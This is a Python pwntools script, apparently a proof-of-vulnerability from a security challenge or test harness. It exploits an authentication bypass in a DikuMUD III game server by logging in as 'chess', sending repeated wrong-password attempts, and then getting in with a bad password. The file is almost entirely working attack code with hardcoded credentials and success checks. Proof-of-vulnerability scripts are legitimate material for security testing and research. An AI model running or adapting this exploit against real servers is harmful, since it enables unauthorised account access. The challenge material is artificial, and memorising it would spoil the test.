import re
import sys
import os
import signal
import requests as req
from requests.auth import HTTPBasicAuth, HTTPDigestAuth
import base64
import multiprocessing
import time
from pwn import *

go_ahead = b'\xff\xf9'
header = b'\xff\xfc\x01'
footer = b'\xff\xfb\x01\xff'

def handler(signum, frame):
    print('Process timeout.')
    print('[FAILED] POV Failed')
    exit(0)

def recvdata(conn):
    footerfound = False
    recvd = conn.recvuntil(go_ahead, timeout=31)
    if not recvd:
        print("Missing go-ahead: quitting")
        exit()
    if recvd.find(header) >= 0:
        recvd = recvd[recvd.find(header) + 5:]
    if recvd.find(footer) >= 0:
        footerfound = True
        recvd = recvd[:recvd.find(footer)]
    if recvd.find(go_ahead) >= 0 and not footerfound:
        recvd = recvd[:recvd.find(go_ahead)]
    #print(recvd)   
    #print('DIKUMUD3:> ' + recvd.decode('utf-8'))
    return recvd.decode('utf-8')

def senddata(conn, data):
    #print('Send:> ' + data)
    conn.sendline(data)

def existinguser_login_bypass(conn, username, password):
    #print(
    conn.recvuntil('By what name do they call you? ').decode('utf-8')  #)
    senddata(conn, username)
    recvdata(conn)
    senddata(conn, '\n')
    recvdata(conn)
    senddata(conn, password)
    
    try:
        dec_result = recvdata(conn)
    except:
        print('[FAILED] POV Failed')
    else:
        if dec_result.find('Welcome back Chess, you last visited DikuMUD III Git') == -1:
            print('[FAILED] POV Failed')
            exit(0)
        ## we will need to do something to prove we have control - internal token or something
        senddata(conn, 's') # south
        recvdata(conn)
        senddata(conn, 's') # south
        #print(conn.recv()) 
        print('Authenitication Bypass Successful')
        print('[SUCCESS] POV Succeeded')


def existingUserLogin(conn, username, password):
    #print(
    conn.recvuntil(b'By what name do they call you? ').decode('utf-8') # )
    senddata(conn, username)
    result=recvdata(conn)
    ## check for message for "ATTENTION" means bad passwords
    #print(result)
    if isBadPassword(result):
        print("Previous bad password")
        senddata(conn, '\n')
        recvdata(conn)
    senddata(conn, password)
    result = conn.recv()
    if result == header:
        return conn.recv()
    else:
        return result


def isBadPassword(message):
    findAttention=message.find('ATTENTION')
    if findAttention == -1:
        return False
    return True


def main():
    global HOST
    global PORT 
    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
    else:
        if 'HOST' in os.environ and 'PORT' in os.environ:
            HOST = os.environ['HOST']
            PORT = int(os.environ['PORT'])
        else:
            print('[ERROR] HOST and PORT must be specified via arguments or variables.')
            sys.exit(1)
    print('Host ' + os.environ['HOST'] + ' and PORT: ' + os.environ['PORT'])
    print('Host ' + HOST + ' and PORT: ' + str(PORT))

    signal.signal(signal.SIGALRM, handler)
    signal.alarm(20)

    username = 'chess'
    password = 'chess123'
    badpass  = 'wontwork'

    # MAKE NEW USER - will need to be an active user -later though
    conn1 = remote(HOST,PORT)
    existingUserLogin(conn1, username, password)
    #conn1.close()
    time.sleep(1)
    for x in range(0,6):
        conn = remote(HOST,PORT)
        existingUserLogin(conn, username, badpass)
        conn.close()
        time.sleep(1)
    conn1.close()
    time.sleep(1)
    conn = remote(HOST,PORT)
    existinguser_login_bypass(conn, username, badpass)
    conn.close()

if __name__ == '__main__':
    main()